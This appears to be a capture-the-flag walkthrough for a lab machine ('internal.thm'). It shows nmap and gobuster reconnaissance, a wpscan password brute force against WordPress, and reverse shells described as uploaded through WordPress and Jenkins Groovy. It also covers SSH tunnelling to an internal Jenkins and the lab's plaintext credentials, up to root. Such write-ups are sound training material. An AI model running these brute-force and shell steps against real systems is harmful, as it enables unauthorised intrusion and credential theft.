# Tools
* nmap
* gobuster
* wpscan  
* Burpsuite

# Techniques  
* editting /etc/hosts
* ssh local forwarding


# Walkthrough

nmap result(./nmap_result)  
	```nmap -v -sV -p1-65535 $TARGET_IP | tee nmap_result```

	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


	
gobuster result(./gobuster_on_80)  
	```gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt | tee gobuster_on_80```

	/blog                 (Status: 301) [Size: 311] [--> http://10.10.88.179/blog/]
	/wordpress            (Status: 301) [Size: 316] [--> http://10.10.88.179/wordpress/]
	/javascript           (Status: 301) [Size: 317] [--> http://10.10.88.179/javascript/]
	/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.88.179/phpmyadmin/]
	/phpmyadmin/index.php            (Status: 200) [Size: 10531]
	/phpmyadmin/templates            (Status: 403) [Size: 277]  
	/phpmyadmin/themes.php           (Status: 200) [Size: 10532]
	/phpmyadmin/themes               (Status: 301) [Size: 324] [--> http://10.10.88.179/phpmyadmin/themes/]
	/phpmyadmin/doc                  (Status: 301) [Size: 321] [--> http://10.10.88.179/phpmyadmin/doc/]   
	/phpmyadmin/license.php          (Status: 200) [Size: 10533]                                           
	/phpmyadmin/navigation.php       (Status: 200) [Size: 10536]                                           
	/phpmyadmin/js                   (Status: 301) [Size: 320] [--> http://10.10.88.179/phpmyadmin/js/]    
	/phpmyadmin/logout.php           (Status: 200) [Size: 10532]                                           
	/phpmyadmin/libraries            (Status: 403) [Size: 277]                                             
	/phpmyadmin/changelog.php        (Status: 200) [Size: 10535]                                           
	/phpmyadmin/url.php              (Status: 302) [Size: 0] [--> /phpmyadmin/]                            
	/phpmyadmin/export.php           (Status: 200) [Size: 10532]                                           
	/phpmyadmin/setup                (Status: 401) [Size: 459]                                             
	/phpmyadmin/sql.php              (Status: 200) [Size: 10529]                                           
	/phpmyadmin/sql                  (Status: 301) [Size: 321] [--> http://10.10.88.179/phpmyadmin/sql/]   
	/phpmyadmin/locale               (Status: 301) [Size: 324] [--> http://10.10.88.179/phpmyadmin/locale/]
	/phpmyadmin/import.php           (Status: 200) [Size: 10532] 
	
After examining /phpmyadmin, seemingly mysql is behind the site.  

SQLMap didn't find any parameter injectable.  

Tried every exploit on metasploit as follows, but they didn't work.   


	0  exploit/unix/webapp/phpmyadmin_config                 2009-03-24       excellent  No     PhpMyAdmin Config File Code Injection
	1  auxiliary/scanner/http/phpmyadmin_login                                normal     No     PhpMyAdmin Login Scanner
	2  post/linux/gather/phpmyadmin_credsteal                                 normal     No     Phpmyadmin credentials stealer
	3  auxiliary/admin/http/telpho10_credential_dump         2016-09-02       normal     No     Telpho10 Backup Credentials Dumper
	4  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
	5  exploit/multi/http/phpmyadmin_3522_backdoor           2012-09-25       normal     No     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
	6  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
	7  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
	8  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()

Scanned $TARGET_IP/blog using wordpress scanning tool, wpscan  
	```wpscan --url 10.10.111.161/blog -e vp,u```  
	One user found: admin  

Using this info, bruteforced passwords  
	```wpscan --url 10.10.111.161/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50```  
	Password Cracked: Username: admin, Password: my2boys  

Modifyied /etc/hosts to help resolve name(internal.thm --> $TARGET_IP)  

Uploaded a reverse shell to wordpress, and got a reverse shell.  
Then, I found an interesting file in /opt directory.  
```
	$ cd /opt
	$ ls
	containerd
	wp-save.txt
	$ cat wp-save.txt
	Bill,

	Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

	aubreanna:bubb13guM!@#123
```

Using this credential, I connect to the target using ssh.  
Found user.txt, in her home directory.  
Also, I found a txt file indicating jenkins is running on 172.17.0.2:8080.  

Ran linpeas.sh on the target.  
	Interesting Info  
		phpmyadmin's credential: wordpress(wordpress123)  

Performed SSH local forwarding to get access to a Jenkins portal page from web browsers.  
```ssh -L 8080:172.17.0.2:8080 aubreanna@$TARGET_IP```  

Then I accessed localhost:8080 from a web browser and performed a brute force on Jenkins Login page using Burpsuite. The wordlist I used was rockyou.txt.(Cracked)  
Then, using Groovy reverse shell scripts, I gained reverse shell to the target as jenkins user.  
Taking a look at /opt directory, I found notes.txt.  
```
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Finally, I successfully connected to the target again using ssh as a root user.
